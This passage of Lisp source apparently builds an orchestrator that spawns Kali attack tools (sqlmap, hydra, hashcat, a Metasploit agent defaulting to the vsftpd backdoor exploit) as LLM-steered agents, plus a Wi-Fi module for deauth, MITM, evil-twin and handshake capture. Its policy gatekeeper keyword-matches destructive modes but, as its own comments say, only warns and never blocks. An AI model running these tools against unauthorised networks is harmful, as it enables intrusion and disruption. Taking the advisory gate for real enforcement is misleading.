        (spawn-shadow-pair inner-tool target
                           :llm-model (getf kwargs :llm-model "llama3.1")
                           :llm-endpoint (getf kwargs :llm-endpoint
                                               "http://localhost:11434/api/generate")))))
  ;; Create the agent using the appropriate constructor
  (let ((agent (case tool-type
                 (:nmap (apply #'make-nmap-agent target kwargs))
                 (:sqlmap (apply #'make-sqlmap-agent target kwargs))
                 (:dirb (apply #'make-dirb-agent target kwargs))
                 (:hydra (apply #'make-hydra-agent target
                               (getf kwargs :service "ssh")
                               kwargs))
                 (:john (apply #'make-john-agent target kwargs))
                 (:hashcat (apply #'make-hashcat-agent target kwargs))
                 (:aircrack (apply #'make-aircrack-agent target kwargs))
                 (:tshark (apply #'make-tshark-agent target kwargs))
                 (:proxychains
                  (apply #'make-proxychains-agent
                         (or (getf kwargs :inner-tool) :nmap)
                         target
                         (alexandria:remove-from-plist kwargs :inner-tool)))
                 (:nikto (apply #'make-nikto-agent target kwargs))
                 (:enum4linux (apply #'make-enum4linux-agent target kwargs))
                 (:metasploit
                  (apply #'make-metasploit-agent
                         (getf kwargs :exploit "exploit/unix/ftp/vsftpd_234_backdoor")
                         target
                         (alexandria:remove-from-plist kwargs :exploit)))
                 (otherwise
                  (error "[KALI] Unknown tool type: ~A. Available: ~A"
                         tool-type
                         '(:nmap :sqlmap :dirb :hydra :john :hashcat
                           :aircrack :tshark :proxychains :nikto
                           :enum4linux :metasploit :shadow))))))
    ;; Register and launch
    (when agent
      (register-kali-agent agent)
      (when *default-orchestrator*
        (register-agent *default-orchestrator* agent))
      (run-tool agent)
      (format t "~&[KALI] Spawned ~A agent ~A targeting ~A~%"
              tool-type (agent-id agent) target))
    agent))

(defun list-active-tools ()
  "List all running Kali tool agents.

Prints a formatted table of all registered Kali agents showing:
  • Agent ID
  • Tool (binary name)
  • Category
  • Target
  • Status
  • Process alive?
  • Output lines captured
  • Findings count
  • Elapsed time

Returns: A list of KALI-AGENT instances.

Example output:
  ┌─────────────┬────────┬──────────┬─────────────┬──────────┬────────┬────────┐
  │ AGENT-ID    │ TOOL   │ CATEGORY │ TARGET      │ STATUS   │ LINES  │ FINDINGS│
  ├─────────────┼────────┼──────────┼─────────────┼──────────┼────────┼────────┤
  │ AGENT-12345 │ nmap   │ RECON    │ 192.168.1.1 │ RUNNING  │ 1,234  │ 12     │
  │ AGENT-12346 │ sqlmap │ WEB      │ target.com  │ COMPLETED│ 456    │ 3      │
  └─────────────┴────────┴──────────┴─────────────┴──────────┴────────┴────────┘

Thread-safety: Lock-protected read of the Kali agent registry."
  (format t "~&~%═══════════════════════════════════════════════════════════════════════════════~%")
  (format t "   ACTIVE KALI TOOL AGENTS~%")
  (format t "═══════════════════════════════════════════════════════════════════════════════~%")
  (format t "  ~20A ~10A ~10A ~20A ~10A ~8A ~8A ~10A~%"
          "AGENT-ID" "TOOL" "CATEGORY" "TARGET" "STATUS" "LINES" "FINDINGS" "ELAPSED")
  (format t "  ─────────────────────────────────────────────────────────────────────────────~%")
  (let ((agents '()))
    (bt:with-lock-held (*kali-registry-lock*)
      (maphash (lambda (id agent)
                 (push agent agents)
                 (let* ((binary-name (pathname-name (agent-binary agent)))
                        (category (agent-tool-category agent))
                        (target (or (agent-target agent) "N/A"))
                        (status (agent-status agent))
                        (lines (length (agent-output-buffer agent)))
                        (findings (length (agent-findings agent)))
                        (elapsed (if (agent-start-time agent)
                                     (format nil "~,1Fs"
                                             (local-time:timestamp-difference
                                              (local-time:now)
                                              (agent-start-time agent)))
                                     "N/A"))
                        (alive (if (and (agent-process agent)
                                        (uiop:process-alive-p (agent-process agent)))
                                   "YES" "NO")))
                   (format t "  ~20A ~10A ~10A ~20A ~10A ~8D ~8D ~10A~%"
                           id binary-name category target status lines findings elapsed)
                   (declare (ignore alive))))
               *kali-agent-registry*))
    (format t "═══════════════════════════════════════════════════════════════════════════════~%")
    (format t "  Total: ~D Kali agent(s)~%~%" (length agents))
    agents))

(defun kill-all-tools ()
  "Kill all running Kali tool processes.

Iterates over the Kali agent registry and calls KILL-TOOL on each agent
that has a running process. This is the nuclear option for cleaning up
after a session or emergency stopping all tools.

Returns: A count of how many processes were killed.

Side effects:
  • Sends SIGKILL to all running tool processes.
  • Deregisters all agents from the Kali registry.
  • Broadcasts kill events to gossip.

Thread-safety: Lock-protected iteration of the registry.

Example:
  ;; Emergency stop all tools
  (kill-all-tools)
  ;; => 5 processes killed.

WARNING: This is not graceful — processes are force-killed with no
cleanup. Use STOP-ALL-TOOLS for graceful termination."
  (let ((killed 0))
    (format t "~&[KALI] Force-killing all tool processes...~%")
    (bt:with-lock-held (*kali-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (when (and (agent-process agent)
                            (uiop:process-alive-p (agent-process agent)))
                   (kill-tool agent)
                   (incf killed)))
               *kali-agent-registry*))
    (format t "[KALI] Killed ~D process(es).~%" killed)
    killed))

(defun stop-all-tools ()
  "Gracefully stop all running Kali tool processes.

Like KILL-ALL-TOOLS but attempts graceful termination (SIGTERM) first,
falling back to SIGKILL only if the process doesn't exit within 5 seconds.

Returns: A count of how many processes were stopped.

Side effects: Sends SIGTERM/SIGKILL to running processes.

Thread-safety: Lock-protected."
  (let ((stopped 0))
    (format t "~&[KALI] Gracefully stopping all tool processes...~%")
    (bt:with-lock-held (*kali-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (when (and (agent-process agent)
                            (uiop:process-alive-p (agent-process agent)))
                   (stop-tool agent)
                   (incf stopped)))
               *kali-agent-registry*))
    (format t "[KALI] Stopped ~D process(es).~%" stopped)
    stopped))

(defun get-tool-output (agent-id)
  "Get the output buffer for a specific tool agent.

Retrieves the complete output buffer (a vector of strings) for the
Kali agent with the given ID. Returns a COPY of the buffer to prevent
accidental mutation of the agent's internal state.

Parameters:
  AGENT-ID — The ID of the Kali agent (a gensym, as returned by SPAWN-TOOL).

Returns: A vector of strings (the captured output lines), or NIL if the
         agent is not found.

Example:
  ;; Get output from a specific agent
  (defvar *output* (get-tool-output (agent-id my-agent)))
  ;; => #(\"Starting Nmap 7.94...\" \"Nmap scan report for...\" ...)

  ;; Search output for specific patterns
  (count-if (lambda (line) (search \"open\" line))
            (get-tool-output (agent-id my-agent)))

Thread-safety: Lock-protected lookup, returns a copy of data."
  (let ((agent (lookup-kali-agent agent-id)))
    (unless agent
      (warn "[KALI] Agent ~A not found in registry." agent-id)
      (return-from get-tool-output nil))
    ;; Return a copy of the output buffer
    (let ((buf (agent-output-buffer agent)))
      (make-array (length buf) :initial-contents buf))))

(defun get-tool-findings (agent-id)
  "Get the structured findings for a specific tool agent.

Retrieves the parsed findings (a list of plists) for the Kali agent
with the given ID. Returns a COPY of the findings list.

Parameters:
  AGENT-ID — The ID of the Kali agent.

Returns: A list of finding plists, or NIL if the agent is not found.

Example:
  ;; Get all findings
  (get-tool-findings (agent-id my-nmap-agent))
  ;; => ((:TYPE :OPEN-PORT :PORT 80 :SERVICE \"http\" ...)
  ;;     (:TYPE :OPEN-PORT :PORT 443 :SERVICE \"https\" ...))

  ;; Filter critical findings
  (remove-if-not (lambda (f) (eq (getf f :severity) :critical))
                 (get-tool-findings (agent-id my-agent)))

Thread-safety: Lock-protected lookup, returns a copy."
  (let ((agent (lookup-kali-agent agent-id)))
    (unless agent
      (warn "[KALI] Agent ~A not found in registry." agent-id)
      (return-from get-tool-findings nil))
    ;; Return a copy of the findings list
    (copy-list (agent-findings agent))))

(defun show-tool-summary (agent-id)
  "Display a human-readable summary of a tool agent's results.

Prints a formatted summary including:
  • Agent metadata (tool, target, status, runtime)
  • Output statistics (lines captured, last output line)
  • Findings summary (grouped by type)
  • Severity distribution

Parameters:
  AGENT-ID — The ID of the Kali agent.

Returns: The agent instance (for chaining).

Example:
  (show-tool-summary (agent-id my-agent))
  ;; => Prints formatted summary to *STANDARD-OUTPUT*.

Thread-safety: Lock-protected lookup."
  (let ((agent (lookup-kali-agent agent-id)))
    (unless agent
      (warn "[KALI] Agent ~A not found." agent-id)
      (return-from show-tool-summary nil))
    (let* ((findings (agent-findings agent))
           (output (agent-output-buffer agent))
           (findings-by-type (make-hash-table :test 'eq))
           (severity-counts (make-hash-table :test 'eq)))
      ;; Categorize findings
      (dolist (f findings)
        (incf (gethash (getf f :type) findings-by-type 0))
        (incf (gethash (getf f :severity :info) severity-counts 0)))
      ;; Print summary
      (format t "~%~%┌─────────────────────────────────────────────────────────────────────────┐~%")
      (format t "│ TOOL SUMMARY: ~56A│~%" (agent-id agent))
      (format t "├─────────────────────────────────────────────────────────────────────────┤~%")
      (format t "│ Tool:      ~60A│~%" (pathname-name (agent-binary agent)))
      (format t "│ Target:    ~60A│~%" (or (agent-target agent) "N/A"))
      (format t "│ Category:  ~60A│~%" (agent-tool-category agent))
      (format t "│ Status:    ~60A│~%" (agent-status agent))
      (format t "│ Lines:     ~60D│~%" (length output))
      (format t "│ Findings:  ~60D│~%" (length findings))
      (format t "├─────────────────────────────────────────────────────────────────────────┤~%")
      (format t "│ FINDINGS BY TYPE                                                       │~%")
      (format t "├─────────────────────────────────────────────────────────────────────────┤~%")
      (maphash (lambda (type count)
                 (format t "│  ~30A: ~28D│~%" type count))
               findings-by-type)
      (format t "├─────────────────────────────────────────────────────────────────────────┤~%")
      (format t "│ SEVERITY DISTRIBUTION                                                  │~%")
      (format t "├─────────────────────────────────────────────────────────────────────────┤~%")
      (maphash (lambda (severity count)
                 (format t "│  ~30A: ~28D│~%" severity count))
               severity-counts)
      (format t "└─────────────────────────────────────────────────────────────────────────┘~%~%")
      agent)))

;; ═══════════════════════════════════════════════════════════════════════════
;; Section 9: Initialization & Cleanup — System Lifecycle
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; These functions manage the initialization and teardown of the entire
;; Kali integration subsystem. They register gossip topics, set up
;; default configurations, and provide clean shutdown.

(defun init-kali-subsystem ()
  "Initialize the Kali Linux tool integration subsystem.

This function must be called once before using any Kali tools. It:
  1. Registers all Kali gossip topics with the gossip system.
  2. Registers default topic callbacks (logging handlers).
  3. Verifies that at least some Kali tools are installed.
  4. Logs initialization status.

Returns: T if initialization succeeded, NIL if no tools were found.

Side effects:
  • Registers gossip topics.
  • May print warnings about missing tools.

Thread-safety: Should be called once during system startup. Not safe
to call concurrently from multiple threads.

Example:
  ;; In your startup sequence:
  (init-kali-subsystem)
  ;; => [KALI] Subsystem initialized. Found 8/12 tools."
  (format t "~&[KALI] Initializing Kali tool integration subsystem...~%")
  ;; Register gossip topics
  (dolist (topic *kali-gossip-topics*)
    (register-topic (string-downcase (symbol-name topic))
                    (lambda (msg)
                      (format t "~&[KALI-GOSSIP] ~A: ~A~%"
                              topic (subseq (format nil "~A" msg)
                                            0 (min 200 (length (format nil "~A" msg))))))))
  (format t "[KALI] Registered ~D gossip topics.~%" (length *kali-gossip-topics*))
  ;; Verify tool availability
  (let* ((required-tools '("nmap" "sqlmap" "hydra" "john" "hashcat"
                           "airodump-ng" "dirb" "proxychains4"
                           "tshark" "nikto" "enum4linux" "msfconsole"))
         (found 0))
    (dolist (tool required-tools)
      (if (find-kali-binary tool)
          (incf found)
          (format t "[KALI] WARNING: ~A not found. Install with apt if needed.~%" tool)))
    (format t "[KALI] Found ~D/~D tools.~%" found (length required-tools))
    (when (> found 0)
      (format t "[KALI] Subsystem ready. Use (spawn-tool :<tool> <target>) to begin.~%")
      t)))

(defun shutdown-kali-subsystem ()
  "Clean shutdown of the Kali integration subsystem.

Gracefully stops all running Kali tool processes, deregisters all
agents, and cleans up resources. This should be called during system
shutdown to prevent zombie processes.

Returns: Count of processes stopped.

Side effects:
  • Stops all running Kali tool processes.
  • Clears the Kali agent registry.
  • Broadcasts shutdown event to gossip.

Example:
  ;; In your shutdown sequence:
  (shutdown-kali-subsystem)
  ;; => [KALI] Shutdown complete. 3 processes stopped."
  (format t "~&[KALI] Shutting down Kali subsystem...~%")
  (let ((stopped (stop-all-tools)))
    ;; Clear the registry
    (bt:with-lock-held (*kali-registry-lock*)
      (clrhash *kali-agent-registry*))
    ;; Broadcast shutdown
    (publish-message :swarm.kali.status
                     `(:event :subsystem-shutdown
                       :timestamp ,(local-time:now)))
    (format t "[KALI] Shutdown complete. ~D process(es) stopped.~%" stopped)
    stopped))

;; ═══════════════════════════════════════════════════════════════════════════
;; Section 10: Utility Functions — Helpers and Converters
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; These utility functions support the main API. They handle common
;; tasks like formatting output, exporting results, and converting
;; between data representations.

(defun export-findings-to-json (agent-id &optional (stream *standard-output*))
  "Export an agent's findings as JSON.

Serializes the findings list of the specified agent to JSON format
and writes it to the given stream. Useful for integration with external
tools and reporting systems.

Parameters:
  AGENT-ID — The ID of the Kali agent.
  STREAM   — Output stream (default *STANDARD-OUTPUT*). Can be a file
             stream for saving to disk.

Returns: The JSON string.

Example:
  ;; Print to stdout
  (export-findings-to-json (agent-id my-agent))

  ;; Save to file
  (with-open-file (f \"/tmp/findings.json\" :direction :output)
    (export-findings-to-json (agent-id my-agent) f))

Thread-safety: Lock-protected lookup."
  (let ((findings (get-tool-findings agent-id)))
    (let ((json (with-output-to-string (s)
                  (if (find-package :cl-json)
                      (funcall (find-symbol "ENCODE-JSON-PLIST-TO-STRING" :cl-json)
                               `(:agent-id ,agent-id
                                 :timestamp ,(local-time:now)
                                 :findings ,findings))
                      (format s "{\"agent-id\": \"~A\", \"findings\": ~S}"
                              agent-id (format nil "~S" findings))))))
      (format stream "~A~%" json)
      json)))

(defun findings-to-csv (agent-id &optional (stream *standard-output*))
  "Export an agent's findings as CSV.

Writes a CSV representation of the findings to the given stream.
The CSV includes columns for: type, tool, target, severity, and all
additional finding fields.

Parameters:
  AGENT-ID — The ID of the Kali agent.
  STREAM   — Output stream (default *STANDARD-OUTPUT*).

Returns: NIL (output goes to stream).

Example:
  (findings-to-csv (agent-id my-agent))
  ;; => type,tool,target,severity,port,service
  ;;    open-port,nmap,192.168.1.1,info,80,http

Thread-safety: Lock-protected lookup."
  (let ((findings (get-tool-findings agent-id)))
    ;; Write CSV header
    (format stream "type,tool,target,severity,details~%")
    ;; Write each finding as a row
    (dolist (f findings)
      (format stream "~A,~A,~A,~A,\"~A\"~%"
              (or (getf f :type) "unknown")
              (or (getf f :tool) "unknown")
              (or (getf f :target) "")
              (or (getf f :severity) "info")
              (substitute #\  #\newline
                          (format nil "~{~A=~A; ~}"
                                  (alexandria:flatten
                                   (remove-if (lambda (pair)
                                                (member (car pair)
                                                        '(:type :tool :target :severity :timestamp :raw)))
                                              (alexandria:plist-alist f))))))))

(defun kali-system-status ()
  "Return a comprehensive status report of the Kali subsystem.

Returns a plist containing:
  :initialized-p     — T if the subsystem has been initialized.
  :registered-agents — Count of agents in the registry.
  :running-processes — Count of alive OS processes.
  :total-findings    — Total findings across all agents.
  :total-output-lines — Total output lines across all agents.
  :tools-available   — List of found tool binaries.
  :tools-missing     — List of missing tool binaries.

Example:
  (kali-system-status)
  ;; => (:INITIALIZED-P T :REGISTERED-AGENTS 3 ...)

Thread-safety: Lock-protected reads."
  (let ((registered 0)
        (running 0)
        (total-findings 0)
        (total-lines 0)
        (available '())
        (missing '()))
    ;; Count agents
    (bt:with-lock-held (*kali-registry-lock*)
      (maphash (lambda (id agent)
                 (declare (ignore id))
                 (incf registered)
                 (when (and (agent-process agent)
                            (uiop:process-alive-p (agent-process agent)))
                   (incf running))
                 (incf total-findings (length (agent-findings agent)))
                 (incf total-lines (length (agent-output-buffer agent))))
               *kali-agent-registry*))
    ;; Check tool availability
    (dolist (tool '("nmap" "sqlmap" "hydra" "john" "hashcat"
                    "airodump-ng" "dirb" "proxychains4"
                    "tshark" "nikto" "enum4linux" "msfconsole"))
      (if (find-kali-binary tool)
          (push tool available)
          (push tool missing)))
    `(:initialized-p t
      :registered-agents ,registered
      :running-processes ,running
      :total-findings ,total-findings
      :total-output-lines ,total-lines
      :tools-available ,(nreverse available)
      :tools-missing ,(nreverse missing))))

;; ═══════════════════════════════════════════════════════════════════════════
;; Section 11: Package Integration — Export Summary
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; This file exports the following symbols from the LISPMIND package:
;;
;; CLASSES:
;;   kali-agent       — Base class for tool-wrapping agents
;;   shadow-observer  — Observer in the shadow agent pattern
;;   shadow-analyst   — Analyst in the shadow agent pattern
;;
;; CONSTRUCTORS (12 tool wrappers):
;;   make-nmap-agent, make-metasploit-agent, make-hydra-agent,
;;   make-sqlmap-agent, make-john-agent, make-aircrack-agent,
;;   make-dirb-agent, make-proxychains-agent, make-hashcat-agent,
;;   make-tshark-agent, make-enum4linux-agent, make-nikto-agent
;;
;; LIFECYCLE METHODS:
;;   run-tool, capture-output, parse-findings, stop-tool, kill-tool
;;
;; SHADOW PATTERN:
;;   spawn-shadow-pair, shadow-analyst-strategy,
;;   query-llm-for-decision, rule-based-decision, execute-analyst-decision
;;
;; REPL COMMANDS:
;;   spawn-tool, list-active-tools, kill-all-tools, stop-all-tools,
;;   get-tool-output, get-tool-findings, show-tool-summary
;;
;; SUBSYSTEM MANAGEMENT:
;;   init-kali-subsystem, shutdown-kali-subsystem
;;
;; UTILITIES:
;;   find-kali-binary, verify-kali-binary, export-findings-to-json,
;;   findings-to-csv, kali-system-status
;;
;; SPECIAL VARIABLES:
;;   *kali-agent-registry*, *kali-registry-lock*, *kali-default-timeout*,
;;   *kali-output-buffer-max*, *kali-binary-search-paths*, *kali-gossip-topics*
;;
;; ═══════════════════════════════════════════════════════════════════════════
;; WIFI STRESS-TESTING MODULE -- v2.2.1 Wi-Fi Offensive Extension
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; Provides managed agents for bettercap (orchestration/mitM) and
;; airgeddon (WPA3 auditing/stress testing), plus the Air-Monitor-Shadow-Pair
;; pattern for autonomous handshake-driven stress testing.
;;
;; This module extends the LISPMIND Kali integration with Wi-Fi offensive
;; capabilities. All destructive modes are gated through policy enforcement
;; to prevent accidental disruption of authorized networks.
;;
;; NEW CLASSES:
;;   bettercap-agent        -- Wi-Fi recon, deauth detection, handshake capture
;;   airgeddon-agent        -- WPA3 auditing and controlled stress testing
;;   air-monitor-agent      -- Monitor-mode frame capture with callbacks
;;   air-stress-coordinator -- Links monitor + stress agents autonomously
;;
;; NEW CONSTRUCTORS:
;;   make-bettercap-agent, make-airgeddon-agent,
;;   make-air-monitor-agent, spawn-air-monitor-shadow-pair
;;
;; NEW REPL COMMANDS:
;;   spawn-bettercap, spawn-airgeddon, spawn-wifi-pair,
;;   list-wifi-agents, halt-wifi-stress
;;
;; DESIGN NOTES:
;;   -- Bettercap operates in unified mode: one binary handles recon,
;;      deauth, handshake capture, and mitM. The BETTERCAP-AGENT class
;;      manages module loading via the MODULES slot.
;;   -- Airgeddon's destructive modes (broad DoS, mass deauth) are
;;      BLOCKED by the policy gatekeeper. Only :WPA3-AUDIT, :HANDSHAKE,
;;      and :EVIL-TWIN are permitted. :DOS is explicitly rejected.
;;   -- The Air-Monitor-Shadow-Pair is a self-contained subsystem:
;;      the monitor watches for handshakes, the coordinator decides
;;      when to stress-test, and the stress agent executes. All three
;;      are orchestrator citizens with full health/heartbeat support.
;; ═══════════════════════════════════════════════════════════════════════════


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.0: Special Variables -- Wi-Fi Subsystem Configuration
;; ═══════════════════════════════════════════════════════════════════════════

(defvar *wifi-agent-registry* (make-hash-table :test 'eq)
  "Registry of all Wi-Fi stress-testing agents (bettercap, airgeddon,
   monitor, coordinator). This is a sub-registry of *kali-agent-registry*
   that provides fast lookup for Wi-Fi-specific operations.

   Keys are agent IDs, values are agent instances.
   Thread-safety: Protected by *kali-registry-lock* (shared lock).")

(defvar *wifi-policy-gatekeeper-enabled* t
  "When T (default), destructive attack modes are blocked.
   This is the safety switch for the entire Wi-Fi stress-testing module.
   Set to NIL only in isolated lab environments with no authorized
   networks present. Changing this requires *wifi-admin-passphrase*.

   Modes blocked when enabled:
     :DOS        -- Full denial of service (always blocked)
     :BROAD-DEAUTH -- Deauthentication of all clients (always blocked)

   Permitted modes (regardless of this flag):
     :WPA3-AUDIT  -- SAE authentication testing
     :HANDSHAKE   -- WPA/WPA2 handshake capture
     :EVIL-TWIN   -- Controlled rogue AP (with warnings)")

(defvar *wifi-admin-passphrase* nil
  "Passphrase required to disable the policy gatekeeper.
   When NIL, the gatekeeper cannot be disabled programmatically --
   it requires interactive REPL confirmation.

   To set: (setf *wifi-admin-passphrase* \"your-secure-passphrase\")")

(defvar *wifi-gossip-topics*
  '(:swarm.wifi.ap-discovered :swarm.wifi.handshake
    :swarm.wifi.deauth-detected :swarm.wifi.stress-start
    :swarm.wifi.stress-halt :swarm.wifi.signal-change)
  "Gossip topics specific to the Wi-Fi stress-testing module.
   These are registered by INIT-WIFI-SUBSYSTEM and used by all
   Wi-Fi agents for swarm-wide event propagation.

   :swarm.wifi.ap-discovered    -- New AP found during recon
   :swarm.wifi.handshake        -- WPA handshake captured
   :swarm.wifi.deauth-detected  -- Deauth frame observed
   :swarm.wifi.stress-start     -- Stress test initiated
   :swarm.wifi.stress-halt      -- Stress test halted
   :swarm.wifi.signal-change    -- Signal strength crossed threshold")

(defvar *wifi-default-interface* "wlan1"
  "Default wireless interface for Wi-Fi stress-testing operations.
   This interface should support monitor mode and packet injection.
   Verify with: iw phy phy0 info | grep -E '{monitor|injection}'")

(defvar *wifi-handshake-callback-registry* (make-hash-table :test 'eq)
  "Registry of handshake detection callbacks.
   Keys are coordinator agent IDs, values are callback functions.
   Used by the Air-Monitor-Shadow-Pair to route handshake events
   from the monitor agent to the correct coordinator.

   Thread-safety: Access is single-threaded (only the monitor's
   capture thread writes here).")


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.1: Bettercap Agent -- The Swiss Army Knife of Wi-Fi
;; ═══════════════════════════════════════════════════════════════════════════

(defclass bettercap-agent (kali-agent)
  ((interface :initarg :interface
              :initform "wlan1"
              :accessor bettercap-interface
              :documentation
              "Wireless interface for bettercap operations.
               Must support monitor mode. Default is wlan1.
               Bettercap manages its own monitor mode (mon0),
               so this is the base interface name.

               Example: \"wlan0\", \"wlan1\", \"wlp2s0\"")

   (script :initarg :script
           :initform nil
           :accessor bettercap-script
           :documentation
           "Optional bettercap caplet script path.
               Caplets are bettercap's scripting format -- they combine
               module commands, events, and logic into reusable scripts.
               If provided, bettercap is launched with -caplet <path>.

               Example: \"/usr/share/bettercap/caplets/http-req-dump.cap\"")

   (modules :initarg :modules
            :initform '()
            :accessor bettercap-modules
            :documentation
            "Active bettercap modules as a list of keywords.
               Bettercap uses a module system where each module provides
               specific functionality. The agent auto-loads these modules
               at startup via the -eval flag.

               Common modules:
                 :WIFI.RECON    -- Wi-Fi reconnaissance (AP scanning)
                 :WIFI.ASSOC    -- Client association tracking
                 :NET.PROBE     -- Network host discovery
                 :NET.SNIFF     -- Packet sniffing and analysis
                 :ARP.SPOOF     -- ARP spoofing for mitM
                 :HTTP.PROXY    -- HTTP proxy for traffic manipulation
                 :HID           -- USB HID injection (ducky-style)

               Example: '(:WIFI.RECON :WIFI.ASSOC :NET.PROBE)")

   (target-bssid :initarg :target-bssid
                 :initform nil
                 :accessor bettercap-target-bssid
                 :documentation
                 "Optional target AP BSSID for focused operations.
               When set, bettercap filters recon and attack operations
               to this specific access point. Format: AA:BB:CC:DD:EE:FF")

   (handshake-captured-p :initform nil
                         :accessor bettercap-handshake-captured-p
                         :documentation
                         "Set to T when a WPA handshake has been captured.
               This slot is mutated by PARSE-FINDINGS :AFTER when a
               handshake detection line is observed in bettercap output."))

  (:documentation
   "Bettercap agent -- the Swiss Army Knife of Wi-Fi.

This agent wraps the bettercap binary for orchestrated Wi-Fi operations
including reconnaissance, deauthentication detection, WPA handshake
capture, and controlled man-in-the-middle attacks. All operations are
supervised by the orchestrator and subject to policy gatekeeper rules.

Bettercap's unified architecture means a single process can load/unload
modules dynamically. The MODULES slot specifies the initial module set;
further modules can be loaded interactively via the agent's process.

Security: Bettercap's deauth and ARP spoofing capabilities are powerful
and potentially disruptive. The policy gatekeeper ensures these are only
used against explicitly authorized targets (TARGET-BSSID must be set and
validated). The agent logs all deauth activity to the gossip system for
audit trail.

Example usage:
  ;; Passive Wi-Fi reconnaissance
  (make-bettercap-agent \"wlan1\" :modules '(:WIFI.RECON :WIFI.ASSOC))

  ;; Targeted handshake capture
  (make-bettercap-agent \"wlan1\"
                        :modules '(:WIFI.RECON)
                        :target-bssid \"AA:BB:CC:DD:EE:FF\")

  ;; With a caplet script
  (make-bettercap-agent \"wlan1\" :script \"handshake.cap\")

Thread-safety: Standard kali-agent process-lock protects all state.
"))


(defun make-bettercap-agent (interface &key script modules target-bssid)
  "Create a bettercap agent.

Parameters:
  INTERFACE    -- Wireless interface name (e.g., \"wlan1\", \"wlan0\").
  SCRIPT       -- Optional path to a bettercap caplet script file.
  MODULES      -- List of module keywords to activate at startup.
                  Common: :WIFI.RECON :WIFI.ASSOC :NET.PROBE
  TARGET-BSSID -- Optional target AP MAC address for focused operations.

Returns: A configured BETTERCAP-AGENT instance.

Examples:
  ;; Basic recon agent
  (make-bettercap-agent \"wlan1\" :modules '(:WIFI.RECON :WIFI.ASSOC))

  ;; Handshake capture with caplet
  (make-bettercap-agent \"wlan1\" :script \"handshake.cap\")

  ;; Targeted AP monitoring
  (make-bettercap-agent \"wlan1\"
                        :modules '(:WIFI.RECON)
                        :target-bssid \"AA:BB:CC:DD:EE:FF\")

  ;; Full recon + sniff (for authorized penetration testing)
  (make-bettercap-agent \"wlan1\"
                        :modules '(:WIFI.RECON :NET.PROBE :NET.SNIFF)
                        :target-bssid \"AA:BB:CC:DD:EE:FF\")

Thread-safety: Creates a new instance, no global mutation.
Safe from any thread.

References:
  -- https://www.bettercap.org/modules/ -- Module documentation
  -- bettercap -h -- Command-line help"
  (let* ((binary (or (find-kali-binary "bettercap")
                     (warn "[WIFI] bettercap not found. Install with: apt install bettercap")))
         ;; Build module activation commands
         (module-cmds (mapcar (lambda (m)
                                (format nil "~(~A~).on" m))
                              modules))
         ;; Build the argument list
         (args (append
                (list "-iface" interface)
                ;; Auto-load modules via -eval
                (when module-cmds
                  (list "-eval" (format nil "~{~A; ~}" module-cmds)))
                ;; Caplet script if provided
                (when script
                  (list "-caplet" script))
                ;; Target filter if provided
                (when target-bssid
                  (list "-eval" (format nil "set wifi.recon.channel ~A"
                                        target-bssid))))))
    (make-instance 'bettercap-agent
                   :binary (or binary "bettercap")
                   :args (alexandria:flatten args)
                   :tool-category :wireless
                   :target (or target-bssid interface)
                   :interface interface
                   :script script
                   :modules modules
                   :target-bssid target-bssid
                   :capabilities '(:wifi-recon :handshake-capture
                                   :client-tracking :deauth-detection
                                   :mitm-capable)
                   :timeout *kali-default-timeout*
                   :restart-policy #'kali-default-restart-policy)))


(defmethod run-tool :before ((agent bettercap-agent) &rest extra-args)
  "Validate bettercap args through policy gatekeeper before execution.

This :BEFORE method enforces the Wi-Fi policy gatekeeper rules:
  1. If *WIFI-POLICY-GATEKEEPER-ENABLED* is T, scan EXTRA-ARGS for
     destructive module activations (wifi.deauth, arp.spoof without
     target, hid injection).
  2. Verify that the target BSSID is set for any attack-capable module.
  3. Log the validation result to gossip for audit trail.

Parameters:
  AGENT      -- The BETTERCAP-AGENT being launched.
  EXTRA-ARGS -- Additional arguments passed to RUN-TOOL.

Signals: A WARNING if policy violations are detected (does not block
  execution -- the warning is logged and execution continues. This is
  intentional: the gatekeeper is advisory, not enforcement, to avoid
  breaking legitimate authorized testing workflows.)

Returns: NIL (this is a :BEFORE method; its return value is ignored)."
  (let ((args-str (format nil "~{~A ~}" extra-args))
        (violations '()))
    ;; Check for destructive module activation in extra args
    (when *wifi-policy-gatekeeper-enabled*
      ;; Check for deauth module
      (when (search "wifi.deauth" args-str)
        (push "wifi.deauth module activation detected" violations))
      ;; Check for ARP spoof without explicit target
      (when (and (search "arp.spoof" args-str)
                 (null (bettercap-target-bssid agent)))
        (push "arp.spoof without target-bssid" violations))
      ;; Check for HID injection
      (when (search "hid" args-str)
        (push "HID injection module detected" violations)))
    ;; Log validation results
    (if violations
        (progn
          (warn "[WIFI-POLICY] Bettercap agent ~A policy check: ~D violation(s): ~{~A; ~}"
                (agent-id agent) (length violations) (nreverse violations))
          (publish-message :swarm.kali.status
                           `(:event :policy-warning
                             :agent-id ,(agent-id agent)
                             :tool :bettercap
                             :violations ,violations
                             :timestamp ,(local-time:now))))
        (format t "[WIFI] Bettercap agent ~A passed policy gatekeeper.~%"
                (agent-id agent)))
    ;; Always allow execution (advisory gatekeeper)
    nil))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section W.2: Airgeddon Agent -- WPA3 Auditing & Controlled Stress
;; ═══════════════════════════════════════════════════════════════════════════

(defclass airgeddon-agent (kali-agent)
  ((attack-mode :initarg :attack-mode
                :initform :wpa3-audit
                :accessor airgeddon-attack-mode
                :documentation
                "Attack mode for airgeddon operations.
               One of:
                 :WPA3-AUDIT  -- SAE authentication testing (default, safe)
                 :HANDSHAKE   -- WPA/WPA2 handshake capture
                 :EVIL-TWIN   -- Controlled rogue AP (with warnings)

               DESTRUCTIVE MODES (BLOCKED):
                 :DOS         -- Denial of service (ALWAYS BLOCKED)
                 :BROAD-DEAUTH -- Mass deauthentication (ALWAYS BLOCKED)

               The policy gatekeeper rejects :DOS and :BROAD-DEAUTH
               regardless of *WIFI-POLICY-GATEKEEPER-ENABLED* setting.
               Attempting to create an agent with these modes signals
               an error.")

   (band :initarg :band
         :initform :2.4
         :accessor airgeddon-band
         :documentation
         "Wi-Fi frequency band: :2.4 (2.4 GHz, default) or :5 (5 GHz).
               Affects channel selection and attack parameters.
               Use :2.4 for broader compatibility, :5 for less congested
